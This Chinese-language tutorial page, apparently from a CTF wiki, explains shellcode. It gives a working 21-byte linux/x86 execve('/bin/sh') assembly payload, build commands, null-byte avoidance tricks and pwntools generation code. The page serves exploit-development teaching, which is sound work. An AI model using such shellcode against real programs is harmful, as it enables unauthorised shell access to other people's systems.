# Shellcode

Shellcode 是一小段代码, 在漏洞利用后用于注入到目标程序中执行. 常见的一个功能是获取 shell 因此得名.

## 编写

以下是一段简单的 shellcode 代码:

```asm
; linux/x86 execve("/bin/sh", 0, 0) 21 bytes
global _start
_start:
    xor  edx, edx ; argv = 0
    xor  ecx, ecx ; envp = 0
    push ecx
    push "/sh"
    push "/bin"
    mov  ebx, esp ; pathname = "/bin/sh"
    mov  al, 0xb  ; execve NR
    int  0x80     ; syscall
```

可以使用在线工具 [Compiler Explorer](https://godbolt.org/) 进行编译, 在 Linux 下可以使用 [NASM - Archive](https://web.archive.org/web/20250408120856/https://www.nasm.us/) 进行编译:

```sh
nasm -f elf32 shellcode.asm             # 编译
ld -m elf_i386 -o shellcode shellcode.o # 链接
objdump -d shellcode                    # 打印反汇编结果
```

设置参数并将系统调用的 NR(number) 写入指定寄存器后触发中断即可. 其他指令集的用法有所不同, 具体使用方式请参考 [Linux 系统调用 - Archive](https://web.archive.org/web/20230602025500/https://publicki.top/syscall.html).

## 定制

根据漏洞的具体情况, shellcode 会受到一定限制. 下面将简要说明如何满足这些限制.

### 限制能使用的字符

以常见的 bad char 0x00('\0') 为例, 观察二进制代码会发现 `push "/sh"` 由于参数大小为 24 比特, 因此被当作 imm32. 最后多出的一字节使用 0 填充, 产生了 0x00, 使得该 shellcode 无法作为一个 C-style 的字符串.  
将该命令改为 `push "//sh` 即可在不影响程序运行/不增加大小的情况下消除这个 0x00.  
传递给 execve 的两个参数也为 0, 这里使用 xor 来将寄存器的值改为 0, 避免直接以 0 作为立即数而导致产生 0x00.

### 限制长度

手工编写专用的 shellcode, 以实现体积最小化. 还可以将体积较大的 shellcode 存放在其他位置(对大小不敏感, 但不能执行), 然后搜索并执行.

!!! info "CTF"
    可能限制系统调用的使用, 此时需要编写专门的 shellcode 只通过可用的系统调用完成任务.

## 生成

- 利用 [MSF](Metasploit.md) 生成 shellcode, 可定制.
- 利用 [ALPHA3](https://github.com/TaQini/alpha3) 生成由可见字符集构成的 shellcode.
- 利用 [pwntools](https://github.com/Gallopsled/pwntools) 生成特定架构和系统的 shellcode, 不可定制.

    ```py
    from pwn import *
    context(arch = 'i386', os = 'linux') # linux/x86
    print shellcraft.sh()      # 输出 shellcode 汇编代码
    print asm(shellcraft.sh()) # 输出 shellcode 二进制代码
    ```

## 参见

- [Exploit Database Shellcodes](https://www.exploit-db.com/shellcodes).
- <http://shell-storm.org/shellcode/>.
